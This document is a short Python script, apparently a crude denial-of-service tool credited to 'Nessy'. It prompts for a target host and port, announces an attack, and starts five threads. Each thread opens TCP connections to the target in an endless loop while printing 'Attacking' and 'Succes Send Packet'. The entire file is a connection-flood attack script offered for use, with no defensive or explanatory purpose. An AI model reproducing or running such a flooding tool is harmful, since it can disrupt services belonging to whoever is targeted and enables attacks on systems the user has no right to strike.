#!/usr/bin/python3
import os
import socket
import sys
import threading
from colorama import Fore, Back, Style
os.system("cls")
host = input("\nEnter host: ")
port = int(input("\nEnter port: "))
print(Back.GREEN + 'Tools By : Nessy')
print(Style.RESET_ALL)
input("Press Enter To Countinue")
print("Starting Attack....")
def run(h):
    while True:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,port))
        print("Attacking : " + host)
        print(Fore.RED + 'Succes Send Packet')
for i in range(5):
    t = threading.Thread(target=run, args=[i])
    t.start()
